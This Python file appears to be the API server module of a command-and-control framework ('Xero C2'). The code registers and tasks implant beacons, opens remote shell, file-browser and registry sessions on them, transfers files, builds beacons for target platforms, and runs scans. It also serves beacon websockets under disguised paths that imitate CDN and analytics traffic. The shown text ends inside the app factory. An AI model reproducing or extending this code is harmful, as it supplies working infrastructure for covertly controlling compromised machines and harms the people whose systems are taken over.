from __future__ import annotations

import asyncio
import uuid
from contextlib import asynccontextmanager, suppress
from datetime import datetime
from secrets import compare_digest
from typing import Annotated

from fastapi import APIRouter, Depends, FastAPI, Header, HTTPException, Query, Request, WebSocket, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, Response
from sqlalchemy import String, cast, select
from sqlalchemy.orm import Session
from xero_common.database import session_factory_for_settings
from xero_common.models import utc_now
from xero_common.readiness import check_readiness
from xero_common.redis_bus import close_redis, get_redis_client, initialize_redis, publish_operator_event
from xero_common.security import (
    AuthTokenError,
    create_c2_access_token,
    decode_c2_access_token,
    generate_beacon_token,
    generate_opaque_token,
    hash_beacon_token,
    hash_opaque_token,
    verify_beacon_token,
)

from xero_c2.artifacts import ArtifactNotFound, ArtifactStorageError, artifact_store_for_settings, read_artifact
from xero_c2.beacon_auth import beacon_auth_exception, bearer_token
from xero_c2.beacon_builds import (
    SUPPORTED_TARGETS,
    artifact_download_filename,
    create_beacon_build,
    public_beacon_build,
    recent_builds,
    run_build_job,
    run_fake_build,
)
from xero_c2.beacon_liveness import (
    BEACON_EVENT_REASON_HEARTBEAT,
    BEACON_STATUS_OFFLINE,
    BEACON_STATUS_ONLINE,
    apply_runtime_metadata,
    publish_beacon_event,
    record_status_transition,
    run_beacon_stale_monitor,
)
from xero_c2.beacon_longpoll import (
    BeaconLongPollManager,
    DuplicateLongPollError,
    update_beacon_longpoll_state,
)
from xero_c2.beacon_transport import BeaconTransportManager
from xero_c2.beacon_websocket import run_beacon_websocket
from xero_c2.config import get_settings
from xero_c2.dashboard import public_dashboard_summary
from xero_c2.file_transfers import (
    FileTransferError,
    create_upload_transfer,
    download_transfer_artifact,
    public_file_transfer,
    stage_upload_chunk,
)
from xero_c2.infrastructure_workers import (
    WORKER_ORIGIN_C2_MANAGED,
    WORKER_ORIGIN_EMBEDDED,
    WORKER_STATUS_FAILED,
    WORKER_STATUS_OFFLINE,
    WORKER_STATUS_ONLINE,
    WORKER_STATUS_STARTING,
    WORKER_STATUS_STOPPING,
    ensure_embedded_workers,
    find_authenticated_worker,
    find_valid_pairing_token,
    issue_pairing_token,
    publish_worker_event,
    record_worker_event,
    run_worker_stale_monitor,
)
from xero_c2.models import (
    Artifact,
    Beacon,
    BeaconBuild,
    BeaconEvent,
    FileTransfer,
    InfrastructureWorker,
    InteractiveSession,
    ProtocolSecurityEvent,
    ResultChunk,
    ScanJob,
    ScanResultChunk,
    Task,
    TaskAuditEvent,
    TaskResult,
    TaskResultArtifact,
    TrafficProfile,
    TrafficProfileVersion,
)
from xero_c2.modules import list_modules
from xero_c2.protocol import (
    ACK,
    CURRENT_PROTOCOL_VERSION,
    FRAME_HEADER_LENGTH,
    HEARTBEAT,
    INTEGRITY_ALGORITHM,
    KEY_EXCHANGE_ALGORITHM,
    PAYLOAD_ENCRYPTION_ALGORITHM,
    PROTOCOL_ERROR,
    REGISTER,
    SESSION_DATA,
    TASK_POLL,
    ProtocolError,
    decode_frame,
    private_key_public_b64,
)
from xero_c2.protocol_processing import (
    c2_protocol_private_key,
    encrypted_protocol_response,
    ensure_nonce_not_replayed,
    frame_metadata,
    process_protocol_frame,
    protocol_error_response,
    protocol_supported_versions,
    record_frame_receipt,
    record_protocol_error,
)
from xero_c2.provisioning import ProvisioningError, launch_worker, stop_worker
from xero_c2.realtime import (
    OperatorRealtimeHub,
    authenticate_websocket,
    close_forbidden,
    close_unauthorized,
    run_operator_websocket,
    websocket_origin_allowed,
)
from xero_c2.scan_jobs import (
    create_scan_job,
    mark_abandoned_scan_jobs,
    public_scan_chunk,
    public_scan_job,
    publish_scan_event,
    run_scan_job,
)
from xero_c2.schemas import (
    BeaconActivityItemResponse,
    BeaconActivityListResponse,
    BeaconBuildCreateRequest,
    BeaconBuildListResponse,
    BeaconBuildResponse,
    BeaconBuildTargetListResponse,
    BeaconBuildTargetResponse,
    BeaconHeartbeatRequest,
    BeaconHeartbeatResponse,
    BeaconKillResponse,
    BeaconListResponse,
    BeaconRegistrationRequest,
    BeaconRegistrationResponse,
    BeaconResponse,
    C2ConnectRequest,
    C2ConnectResponse,
    C2SessionResponse,
    DashboardSummaryResponse,
    FileBrowserSessionCreateRequest,
    FileBrowserSessionResponse,
    FileTransferChunkUploadRequest,
    FileTransferCreateRequest,
    FileTransferResponse,
    InfrastructureWorkerListResponse,
    InfrastructureWorkerResponse,
    ModuleDefinitionResponse,
    ModuleListResponse,
    PairingTokenCreateRequest,
    PairingTokenCreateResponse,
    ProtocolInfoResponse,
    ProtocolSecurityEventListResponse,
    ProtocolSecurityEventResponse,
    RegistrySessionCreateRequest,
    RegistrySessionResponse,
    ScanJobCreateRequest,
    ScanJobListResponse,
    ScanJobResponse,
    ScanJobStatus,
    ScanResultChunkListResponse,
    ScanResultChunkResponse,
    SessionResponse,
    ShellSessionCreateRequest,
    ShellSessionResponse,
    TaskAuditEventListResponse,
    TaskAuditEventResponse,
    TaskCreateRequest,
    TaskListResponse,
    TaskResponse,
    TaskResultChunkListResponse,
    TaskResultChunkResponse,
    TaskResultListResponse,
    TaskResultResponse,
    TaskStatus,
    TrafficProfileAssignRequest,
    TrafficProfileCloneRequest,
    TrafficProfileCreateRequest,
    TrafficProfileListResponse,
    TrafficProfileResponse,
    TrafficProfileRollbackRequest,
    TrafficProfileUpdateRequest,
    TrafficProfileVersionListResponse,
    TrafficProfileVersionResponse,
    TransportStatusResponse,
    WorkerHeartbeatRequest,
    WorkerHeartbeatResponse,
    WorkerLaunchRequest,
    WorkerLaunchResponse,
    WorkerRegistrationRequest,
    WorkerRegistrationResponse,
    WorkerStopResponse,
)
from xero_c2.sessions import (
    ACTIVE_SESSION_STATUSES,
    FILE_BROWSER_SESSION_TYPE,
    REGISTRY_SESSION_TYPE,
    SESSION_OP_CLOSE,
    SESSION_OP_OPEN,
    FileListingCache,
    SessionRelayManager,
    apply_beacon_session_data,
    close_shell_session,
    create_file_browser_session,
    create_registry_session,
    create_shell_session,
    enqueue_session_data_frame,
    expire_idle_sessions,
    public_session,
    public_shell_session,
    publish_session_event,
    publish_session_payload_event,
    run_session_cleanup_monitor,
    run_shell_session_websocket,
    session_frame_payload,
)
from xero_c2.task_audit import public_task_audit_event, record_task_audit_event
from xero_c2.task_queue import (
    TASK_STATUS_QUEUED,
    TaskQueueService,
    TaskQueueUnavailable,
    cancel_task,
    dispatch_next_task,
    encode_task_ack_frame,
    public_task,
    requeue_dispatched_task,
    task_delivery_payload,
    task_event_type,
    task_queue_unavailable_exception,
    validate_task_timeout,
)
from xero_c2.task_results import (
    download_text_for_result,
    public_task_result,
    public_task_result_chunk,
    purge_expired_task_results,
    run_task_result_retention_monitor,
)
from xero_c2.traffic_profiles import (
    assign_profile_to_beacon,
    clone_profile,
    create_profile,
    ensure_template_profiles,
    find_profile,
    profile_ack_fields,
    public_traffic_profile,
    public_traffic_profile_version,
    rollback_profile,
    update_profile,
)


def get_db_session():
    settings = get_settings()
    SessionFactory = session_factory_for_settings(settings)
    with SessionFactory() as session:
        yield session


DbSession = Annotated[Session, Depends(get_db_session)]


def liveness_payload() -> dict[str, str]:
    settings = get_settings()
    return {
        "status": "ok",
        "service": settings.service_name,
        "role": settings.service_role,
        "environment": settings.app_env,
    }


def public_beacon(beacon: Beacon) -> dict:
    profile = beacon.profile
    return {
        "id": str(beacon.id),
        "machine_fingerprint_hash": beacon.machine_fingerprint_hash,
        "hostname": beacon.hostname,
        "os": beacon.os,
        "architecture": beacon.architecture,
        "internal_ip": beacon.internal_ip,
        "external_ip": beacon.external_ip,
        "pid": beacon.pid,
        "status": beacon.status,
        "profile_id": str(beacon.profile_id) if beacon.profile_id else None,
        "profile_name": profile.name if profile else None,
        "profile_template": profile.template if profile else None,
        "profile_version": profile.current_version if profile else None,
        "applied_profile_version": beacon.applied_profile_version,
        "profile_applied_at": beacon.profile_applied_at.isoformat() if beacon.profile_applied_at else None,
        "sleep_seconds": beacon.sleep_seconds,
        "jitter": beacon.jitter,
        "protocol_version": beacon.protocol_version,
        "transport_mode": beacon.transport_mode,
        "transport_connected": beacon.transport_connected,
        "transport_last_seen": beacon.transport_last_seen.isoformat() if beacon.transport_last_seen else None,
        "removed_at": beacon.removed_at.isoformat() if beacon.removed_at else None,
        "removed_by": beacon.removed_by,
        "removed_reason": beacon.removed_reason,
        "first_seen": beacon.first_seen.isoformat(),
        "last_seen": beacon.last_seen.isoformat(),
    }


def public_worker(worker: InfrastructureWorker) -> dict:
    return {
        "id": str(worker.id),
        "kind": worker.kind,
        "name": worker.name,
        "origin": worker.origin,
        "status": worker.status,
        "endpoint": worker.endpoint,
        "capabilities": worker.capabilities or [],
        "capacity": worker.capacity,
        "current_load": worker.current_load,
        "version": worker.version,
        "last_seen": worker.last_seen.isoformat() if worker.last_seen else None,
        "managed_project": worker.managed_project,
        "managed_service": worker.managed_service,
        "managed_host_port": worker.managed_host_port,
        "last_error": worker.last_error,
        "created_at": worker.created_at.isoformat(),
        "updated_at": worker.updated_at.isoformat(),
    }


def public_protocol_security_event(event: ProtocolSecurityEvent) -> dict:
    return {
        "id": str(event.id),
        "beacon_id": str(event.beacon_id) if event.beacon_id else None,
        "event_type": event.event_type,
        "severity": event.severity,
        "message": event.message,
        "session_id": event.session_id,
        "nonce": event.nonce,
        "occurred_at": event.occurred_at.isoformat(),
    }


def check_artifact_store(settings) -> dict[str, str]:
    try:
        artifact_store_for_settings(settings).ensure_ready()
        return {"status": "healthy"}
    except Exception as exc:
        return {"status": "unhealthy", "error": str(exc)}


def c2_readiness_report(settings) -> dict:
    report = check_readiness(settings)
    report["checks"]["artifact_store"] = check_artifact_store(settings)
    ready = all(check["status"] == "healthy" for check in report["checks"].values())
    report["status"] = "ready" if ready else "degraded"
    return report


async def publish_task_event(app: FastAPI, settings, event_type: str, task_payload: dict) -> None:
    redis_client = getattr(app.state, "redis_client", None)
    event = await publish_operator_event(
        redis_client,
        settings,
        event_type,
        data={"task": task_payload},
        scope={"beacon_id": task_payload["beacon_id"], "task_id": task_payload["id"]},
    )
    if redis_client is None:
        await app.state.operator_realtime_hub.broadcast(event)


async def publish_task_result_event(app: FastAPI, settings, event_type: str, result_payload: dict) -> None:
    redis_client = getattr(app.state, "redis_client", None)
    event = await publish_operator_event(
        redis_client,
        settings,
        event_type,
        data={"task_result": result_payload},
        scope={"beacon_id": result_payload["beacon_id"], "task_id": result_payload["task_id"]},
    )
    if redis_client is None:
        await app.state.operator_realtime_hub.broadcast(event)


async def publish_task_result_chunk_event(app: FastAPI, settings, event_type: str, chunk_payload: dict) -> None:
    redis_client = getattr(app.state, "redis_client", None)
    event = await publish_operator_event(
        redis_client,
        settings,
        event_type,
        data={"task_result_chunk": chunk_payload},
        scope={"beacon_id": chunk_payload["beacon_id"], "task_id": chunk_payload["task_id"]},
    )
    if redis_client is None:
        await app.state.operator_realtime_hub.broadcast(event)


def beacon_removed_exception() -> HTTPException:
    return HTTPException(status_code=status.HTTP_410_GONE, detail="Beacon has been removed")


def ensure_beacon_active(beacon: Beacon) -> None:
    if beacon.removed_at is not None:
        raise beacon_removed_exception()


async def close_interactive_session_for_operator(
    app: FastAPI,
    settings,
    session: Session,
    shell_session: InteractiveSession,
    *,
    reason: str,
) -> dict | None:
    if shell_session.status in {"closed", "failed"}:
        return None
    close_payload = session_frame_payload(
        shell_session,
        SESSION_OP_CLOSE,
        reason=reason,
        session_type=shell_session.session_type,
    )
    with suppress(HTTPException):
        await enqueue_session_data_frame(app, settings, session, shell_session, close_payload)
    close_shell_session(shell_session, reason=reason)
    session.add(shell_session)
    session.flush()
    return public_session(shell_session)


async def publish_closed_session_payload(app: FastAPI, settings, session_payload: dict) -> None:
    session_id = uuid.UUID(session_payload["id"])
    await app.state.session_file_cache.clear_session(session_id)
    await app.state.session_relay_manager.deliver(
        session_id,
        {"op": "closed", "session": session_payload},
    )
    await publish_session_payload_event(app, settings, "session.closed", session_payload)


def public_beacon_activity_item(item: dict) -> dict:
    return {
        "id": item["id"],
        "type": item["type"],
        "label": item["label"],
        "occurred_at": item["occurred_at"],
        "beacon_id": str(item["beacon_id"]),
        "task_id": str(item["task_id"]) if item.get("task_id") else None,
        "session_id": str(item["session_id"]) if item.get("session_id") else None,
        "status": item.get("status"),
        "detail": item.get("detail"),
    }


def beacon_activity_items(session: Session, beacon: Beacon, *, limit: int) -> list[dict]:
    items: list[dict] = []
    beacon_events = (
        session.execute(
            select(BeaconEvent)
            .where(BeaconEvent.beacon_id == beacon.id)
            .order_by(BeaconEvent.occurred_at.desc(), BeaconEvent.created_at.desc())
            .limit(limit)
        )
        .scalars()
        .all()
    )
    for event in beacon_events:
        items.append(
            {
                "id": f"beacon-{event.id}",
                "type": "beacon.status",
                "label": f"Beacon changed from {event.old_status} to {event.new_status}",
                "occurred_at": event.occurred_at,
                "beacon_id": event.beacon_id,
                "status": event.new_status,
                "detail": event.reason,
            }
        )

    task_events = (
        session.execute(
            select(TaskAuditEvent)
            .where(TaskAuditEvent.beacon_id == beacon.id)
            .order_by(TaskAuditEvent.occurred_at.desc(), TaskAuditEvent.created_at.desc())
            .limit(limit)
        )
        .scalars()
        .all()
    )
    for event in task_events:
        command = f" {event.command}" if event.command else ""
        items.append(
            {
                "id": f"task-{event.id}",
                "type": event.event_type,
                "label": f"Task{command} {event.task_status or 'updated'}",
                "occurred_at": event.occurred_at,
                "beacon_id": event.beacon_id,
                "task_id": event.task_id,
                "status": event.task_status,
                "detail": event.message,
            }
        )

    sessions = (
        session.execute(
            select(InteractiveSession)
            .where(InteractiveSession.beacon_id == beacon.id)
            .order_by(InteractiveSession.updated_at.desc(), InteractiveSession.created_at.desc())
            .limit(limit)
        )
        .scalars()
        .all()
    )
    for shell_session in sessions:
        occurred_at = shell_session.closed_at or shell_session.opened_at
        items.append(
            {
                "id": f"session-{shell_session.id}",
                "type": f"session.{shell_session.status}",
                "label": f"{shell_session.session_type.replace('_', ' ').title()} session {shell_session.status}",
                "occurred_at": occurred_at,
                "beacon_id": shell_session.beacon_id,
                "session_id": shell_session.id,
                "status": shell_session.status,
                "detail": shell_session.close_reason,
            }
        )

    if beacon.removed_at is not None:
        items.append(
            {
                "id": f"beacon-removed-{beacon.id}",
                "type": "beacon.killed",
                "label": "Beacon removed from active inventory",
                "occurred_at": beacon.removed_at,
                "beacon_id": beacon.id,
                "status": "removed",
                "detail": beacon.removed_reason,
            }
        )

    items.sort(key=lambda item: item["occurred_at"], reverse=True)
    return [public_beacon_activity_item(item) for item in items[:limit]]


def schedule_scan_execution(app: FastAPI, settings, scan_job_id: uuid.UUID) -> None:
    task = asyncio.create_task(run_scan_job(app, settings, scan_job_id))
    app.state.scan_background_tasks.add(task)
    task.add_done_callback(app.state.scan_background_tasks.discard)


def pairing_command(settings, *, kind: str, token: str, name: str) -> str:
    service = "beacon-handler" if kind == "beacon-handler" else "scanner"
    compose_file = "docker-compose.handler.yml" if kind == "beacon-handler" else "docker-compose.scanner.yml"
    return (
        f"C2_BASE_URL={settings.worker_connect_url} "
        f"WORKER_PAIRING_TOKEN={token} "
        f"WORKER_NAME=\"{name}\" "
        f"docker compose -f {compose_file} up -d --build {service}"
    )


def auth_exception() -> HTTPException:
    return HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Invalid or missing C2 authentication token",
        headers={"WWW-Authenticate": "Bearer"},
    )


def worker_auth_exception() -> HTTPException:
    return HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Invalid or missing worker token",
        headers={"WWW-Authenticate": "Bearer"},
    )


def reset_beacon_transport_connections(session: Session) -> None:
    beacons = session.execute(select(Beacon).where(Beacon.transport_connected.is_(True))).scalars()
    for beacon in beacons:
        beacon.transport_connected = False
        session.add(beacon)


def transport_mode_counts(session: Session) -> dict[str, int]:
    counts = {"long-poll": 0, "rest": 0, "websocket": 0}
    modes = session.execute(select(Beacon.transport_mode)).scalars()
    for mode in modes:
        counts[mode] = counts.get(mode, 0) + 1
    return counts


def validate_longpoll_frame_beacon(decoded, beacon_id: uuid.UUID) -> None:
    if decoded.message_type == REGISTER:
        raise ProtocolError("REGISTER_NOT_ALLOWED", "Long-poll frame endpoint requires an existing beacon")
    if decoded.payload.get("beacon_id") != str(beacon_id):
        raise ProtocolError(
            "BEACON_ID_MISMATCH",
            "Frame beacon_id does not match the authenticated beacon",
            status_code=status.HTTP_403_FORBIDDEN,
    )


async def attach_dispatched_task_to_ack(
    app: FastAPI,
    session: Session,
    settings,
    *,
    beacon_id: uuid.UUID | None,
    ack_payload: dict,
) -> dict | None:
    if beacon_id is None:
        return None
    task = await dispatch_next_task(
        session,
        settings,
        app.state.task_queue_service,
        getattr(app.state, "redis_client", None),
        beacon_id=beacon_id,
    )
    if task is None:
        return None
    task_payload = public_task(task)
    ack_payload["task"] = task_delivery_payload(task)
    return task_payload


async def build_next_longpoll_task_frame(app: FastAPI, settings, beacon_id: uuid.UUID) -> tuple[bytes, dict] | None:
    if not app.state.beacon_longpoll_manager.is_active(beacon_id):
        return None
    SessionFactory = session_factory_for_settings(settings)
    with SessionFactory() as session:
        beacon = session.get(Beacon, beacon_id)
        if (
            beacon is None
            or beacon.removed_at is not None
            or not beacon.protocol_session_id
            or not beacon.protocol_peer_public_key_b64
        ):
            return None
        task = await dispatch_next_task(
            session,
            settings,
            app.state.task_queue_service,
            getattr(app.state, "redis_client", None),
            beacon_id=beacon_id,
        )
        if task is None:
            return None
        try:
            profile_fields = profile_ack_fields(session, settings, beacon)
            frame = encode_task_ack_frame(settings, beacon, task, profile_fields=profile_fields, transport="long-poll")
        except ProtocolError:
            await requeue_dispatched_task(
                session,
                app.state.task_queue_service,
                getattr(app.state, "redis_client", None),
                task,
            )
            session.commit()
            return None
        task_payload = public_task(task)
        session.commit()
        return frame, task_payload


def encrypted_protocol_error_response(settings, decoded, exc: ProtocolError) -> Response:
    frame = encrypted_protocol_response(
        settings,
        decoded,
        PROTOCOL_ERROR,
        {"status": "error", "code": exc.code, "message": exc.message},
    )
    frame.status_code = exc.status_code
    return frame


def worker_bearer_token(authorization: str | None) -> str:
    scheme, _, token = (authorization or "").partition(" ")
    if scheme.lower() != "bearer" or not token:
        raise worker_auth_exception()
    return token


def authorize_c2_token(settings, authorization: str | None) -> dict:
    scheme, _, token = (authorization or "").partition(" ")
    if scheme.lower() != "bearer" or not token:
        raise auth_exception()
    try:
        return decode_c2_access_token(token, settings)
    except AuthTokenError:
        raise auth_exception() from None


def actor_subject_from_claims(claims: dict) -> str:
    subject = claims.get("operator_id") or claims.get("sub") or "xero-ui-client"
    return str(subject)


def create_app() -> FastAPI:
    settings = get_settings()
    realtime_hub = OperatorRealtimeHub(settings)
    beacon_transport_manager = BeaconTransportManager(queue_size=settings.beacon_ws_send_queue_size)
    beacon_longpoll_manager = BeaconLongPollManager()
    session_relay_manager = SessionRelayManager(queue_size=settings.session_ws_queue_size)
    session_file_cache = FileListingCache(ttl_seconds=5)
    task_queue_service = TaskQueueService(app_env=settings.app_env)
    scan_background_tasks: set[asyncio.Task[None]] = set()

    @asynccontextmanager
    async def lifespan(app: FastAPI):
        await initialize_redis(app, settings)
        app.state.operator_realtime_hub = realtime_hub
        app.state.beacon_transport_manager = beacon_transport_manager
        app.state.beacon_longpoll_manager = beacon_longpoll_manager
        app.state.session_relay_manager = session_relay_manager
        app.state.session_file_cache = session_file_cache
        app.state.task_queue_service = task_queue_service
        app.state.scan_background_tasks = scan_background_tasks
        stale_monitor_task: asyncio.Task[None] | None = None
        worker_monitor_task: asyncio.Task[None] | None = None
        result_retention_task: asyncio.Task[None] | None = None
        session_cleanup_task: asyncio.Task[None] | None = None
        SessionFactory = session_factory_for_settings(settings)
        with SessionFactory() as session:
            ensure_embedded_workers(session, settings)
            ensure_template_profiles(session)
            mark_abandoned_scan_jobs(session)
            reset_beacon_transport_connections(session)
            purge_expired_task_results(session, settings)
            expire_idle_sessions(session, settings)
            session.commit()
        if settings.app_env.lower() != "test":
            await realtime_hub.start(getattr(app.state, "redis_client", None))
            stale_monitor_task = asyncio.create_task(run_beacon_stale_monitor(app, settings, public_beacon))
            worker_monitor_task = asyncio.create_task(run_worker_stale_monitor(app, settings, public_worker))
            result_retention_task = asyncio.create_task(run_task_result_retention_monitor(app, settings))
            session_cleanup_task = asyncio.create_task(run_session_cleanup_monitor(app, settings))
        try:
            yield
        finally:
            if stale_monitor_task is not None:
                stale_monitor_task.cancel()
                with suppress(asyncio.CancelledError):
                    await stale_monitor_task
            if worker_monitor_task is not None:
                worker_monitor_task.cancel()
                with suppress(asyncio.CancelledError):
                    await worker_monitor_task
            if result_retention_task is not None:
                result_retention_task.cancel()
                with suppress(asyncio.CancelledError):
                    await result_retention_task
            if session_cleanup_task is not None:
                session_cleanup_task.cancel()
                with suppress(asyncio.CancelledError):
                    await session_cleanup_task
            for task in list(scan_background_tasks):
                task.cancel()
            for task in list(scan_background_tasks):
                with suppress(asyncio.CancelledError):
                    await task
            await beacon_transport_manager.close_all()
            await beacon_longpoll_manager.close_all()
            await session_relay_manager.close_all()
            await realtime_hub.stop()
            await close_redis(app)

    app = FastAPI(title="Xero C2 API", version="0.1.0", lifespan=lifespan)
    app.state.operator_realtime_hub = realtime_hub
    app.state.beacon_transport_manager = beacon_transport_manager
    app.state.beacon_longpoll_manager = beacon_longpoll_manager
    app.state.session_relay_manager = session_relay_manager
    app.state.session_file_cache = session_file_cache
    app.state.task_queue_service = task_queue_service
    app.state.scan_background_tasks = scan_background_tasks

    app.add_middleware(
        CORSMiddleware,
        allow_origins=[settings.frontend_origin],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )

    @app.exception_handler(Exception)
    async def unhandled_exception_handler(_, exc: Exception) -> JSONResponse:
        return JSONResponse(
            status_code=500,
            content={"detail": "Internal server error", "error": exc.__class__.__name__},
        )

    @app.get("/health", tags=["health"])
    def health() -> dict[str, str]:
        return liveness_payload()

    @app.get("/ready", tags=["health"])
    def ready() -> JSONResponse:
        report = c2_readiness_report(settings)
        status_code = 200 if report["status"] == "ready" else 503
        return JSONResponse(status_code=status_code, content=report)

    @app.websocket("/ws/operator")
    async def operator_websocket(websocket: WebSocket) -> None:
        if not websocket_origin_allowed(websocket, settings):
            await close_forbidden(websocket)
            return

        authenticated = authenticate_websocket(websocket, settings)
        if authenticated is None:
            await close_unauthorized(websocket)
            return

        principal, accepted_protocol = authenticated
        await run_operator_websocket(
            websocket,
            hub=websocket.app.state.operator_realtime_hub,
            principal=principal,
            accepted_protocol=accepted_protocol,
        )

    @app.websocket("/ws/beacon")
    async def beacon_websocket(websocket: WebSocket) -> None:
        await run_beacon_websocket(websocket, settings=settings, public_beacon=public_beacon)

    @app.websocket("/cdn-cgi/xero/ws")
    async def cloudfront_beacon_websocket(websocket: WebSocket) -> None:
        await run_beacon_websocket(websocket, settings=settings, public_beacon=public_beacon)

    @app.websocket("/g/collect/ws")
    async def analytics_beacon_websocket(websocket: WebSocket) -> None:
        await run_beacon_websocket(websocket, settings=settings, public_beacon=public_beacon)

    @app.websocket("/ws/sessions/{session_id}")
    async def shell_session_websocket(websocket: WebSocket, session_id: uuid.UUID) -> None:
        if not websocket_origin_allowed(websocket, settings):
            await close_forbidden(websocket)
            return
        await run_shell_session_websocket(websocket, settings=settings, session_id=session_id)

    api_router = APIRouter(prefix=settings.api_v1_prefix)

    @api_router.post("/c2/connect", response_model=C2ConnectResponse, tags=["c2"])
    def connect_c2(payload: C2ConnectRequest) -> C2ConnectResponse:
        if not compare_digest(payload.password, settings.c2_connect_password):
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Invalid C2 connection password",
                headers={"WWW-Authenticate": "Bearer"},
            )

        token, expires_at = create_c2_access_token(settings)
        return C2ConnectResponse(
            access_token=token,
            expires_at=expires_at,
            service=settings.service_name,
            service_role=settings.service_role,
        )

    @api_router.get("/c2/session", response_model=C2SessionResponse, tags=["c2"])
    def c2_session(authorization: Annotated[str | None, Header()] = None) -> C2SessionResponse:
        authorize_c2_token(settings, authorization)
        return C2SessionResponse(service=settings.service_name, service_role=settings.service_role, status="connected")

    @api_router.get("/dashboard/summary", response_model=DashboardSummaryResponse, tags=["dashboard"])
    def dashboard_summary(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> DashboardSummaryResponse:
        authorize_c2_token(settings, authorization)
        return DashboardSummaryResponse(
            **public_dashboard_summary(session, c2_health=c2_readiness_report(settings))
        )

    @api_router.get("/transport", response_model=TransportStatusResponse, tags=["transport"])
    def transport_status(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> TransportStatusResponse:
        authorize_c2_token(settings, authorization)
        return TransportStatusResponse(
            active_websocket_connections=app.state.beacon_transport_manager.active_count,
            active_longpoll_requests=app.state.beacon_longpoll_manager.active_count,
            transport_mode_counts=transport_mode_counts(session),
            websocket_send_queue_size=settings.beacon_ws_send_queue_size,
            websocket_registration_timeout_seconds=settings.beacon_ws_registration_timeout_seconds,
            websocket_heartbeat_timeout_seconds=settings.beacon_ws_heartbeat_timeout_seconds,
            websocket_ping_interval_seconds=settings.beacon_ws_ping_interval_seconds,
            websocket_ping_timeout_seconds=settings.beacon_ws_ping_timeout_seconds,
            websocket_max_message_bytes=settings.beacon_ws_max_message_bytes,
            longpoll_timeout_seconds=settings.beacon_longpoll_timeout_seconds,
            longpoll_max_frame_bytes=settings.beacon_longpoll_max_frame_bytes,
        )

    @api_router.get("/protocol", response_model=ProtocolInfoResponse, tags=["protocol"])
    def protocol_info(authorization: Annotated[str | None, Header()] = None) -> ProtocolInfoResponse:
        authorize_c2_token(settings, authorization)
        private_key = c2_protocol_private_key(settings)
        return ProtocolInfoResponse(
            current_version=CURRENT_PROTOCOL_VERSION,
            supported_versions=protocol_supported_versions(settings),
            key_exchange=KEY_EXCHANGE_ALGORITHM,
            encryption=PAYLOAD_ENCRYPTION_ALGORITHM,
            integrity=INTEGRITY_ALGORITHM,
            frame_header_length=FRAME_HEADER_LENGTH,
            max_frame_bytes=settings.protocol_max_frame_bytes,
            c2_public_key_b64=private_key_public_b64(private_key),
            frame_harness_enabled=settings.protocol_frame_harness_enabled,
        )

    @api_router.get("/modules", response_model=ModuleListResponse, tags=["modules"])
    def list_module_catalog(authorization: Annotated[str | None, Header()] = None) -> ModuleListResponse:
        authorize_c2_token(settings, authorization)
        return ModuleListResponse(items=[ModuleDefinitionResponse(**item) for item in list_modules()])

    @api_router.post("/scan-jobs", response_model=ScanJobResponse, tags=["scan-jobs"])
    async def create_scan_job_route(
        payload: ScanJobCreateRequest,
        request: Request,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> ScanJobResponse:
        claims = authorize_c2_token(settings, authorization)
        try:
            ensure_embedded_workers(session, settings)
            job = create_scan_job(
                session,
                actor_subject=actor_subject_from_claims(claims),
                module=payload.module,
                raw_args=payload.args,
            )
            session.commit()
            session.refresh(job)
        except ValueError as exc:
            session.rollback()
            raise HTTPException(status_code=status.HTTP_422_UNPROCESSABLE_ENTITY, detail=str(exc)) from exc
        job_payload = public_scan_job(job)
        await publish_scan_event(request.app, settings, "scan.job.queued", job_payload)
        schedule_scan_execution(request.app, settings, job.id)
        return ScanJobResponse(**job_payload)

    @api_router.get("/scan-jobs", response_model=ScanJobListResponse, tags=["scan-jobs"])
    def list_scan_jobs(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        status_filter: Annotated[ScanJobStatus | None, Query(alias="status")] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 25,
    ) -> ScanJobListResponse:
        authorize_c2_token(settings, authorization)
        query = select(ScanJob).order_by(ScanJob.created_at.desc())
        if status_filter is not None:
            query = query.where(ScanJob.status == status_filter)
        query = query.limit(limit)
        jobs = session.execute(query).scalars().all()
        return ScanJobListResponse(items=[ScanJobResponse(**public_scan_job(job)) for job in jobs])

    @api_router.get("/scan-jobs/{scan_job_id}", response_model=ScanJobResponse, tags=["scan-jobs"])
    def get_scan_job(
        scan_job_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> ScanJobResponse:
        authorize_c2_token(settings, authorization)
        job = session.get(ScanJob, scan_job_id)
        if job is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Scan job not found")
        return ScanJobResponse(**public_scan_job(job))

    @api_router.get(
        "/scan-jobs/{scan_job_id}/chunks",
        response_model=ScanResultChunkListResponse,
        tags=["scan-jobs"],
    )
    def list_scan_result_chunks(
        scan_job_id: uuid.UUID,
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
    ) -> ScanResultChunkListResponse:
        authorize_c2_token(settings, authorization)
        job = session.get(ScanJob, scan_job_id)
        if job is None:
            raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Scan job not found")
        chunks = session.execute(
            select(ScanResultChunk)
            .where(ScanResultChunk.scan_job_id == scan_job_id)
            .order_by(ScanResultChunk.sequence.asc())
        ).scalars()
        return ScanResultChunkListResponse(
            items=[ScanResultChunkResponse(**public_scan_chunk(chunk)) for chunk in chunks]
        )

    @api_router.get(
        "/security/events",
        response_model=ProtocolSecurityEventListResponse,
        tags=["security"],
    )
    def list_protocol_security_events(
        session: DbSession,
        authorization: Annotated[str | None, Header()] = None,
        limit: Annotated[int, Query(ge=1, le=100)] = 25,
    ) -> ProtocolSecurityEventListResponse:
        authorize_c2_token(settings, authorization)
        events = session.execute(
            select(ProtocolSecurityEvent).order_by(ProtocolSecurityEvent.occurred_at.desc()).limit(limit)
        ).scalars()
        return ProtocolSecurityEventListResponse(
            items=[ProtocolSecurityEventResponse(**public_protocol_security_event(event)) for event in events]
        )

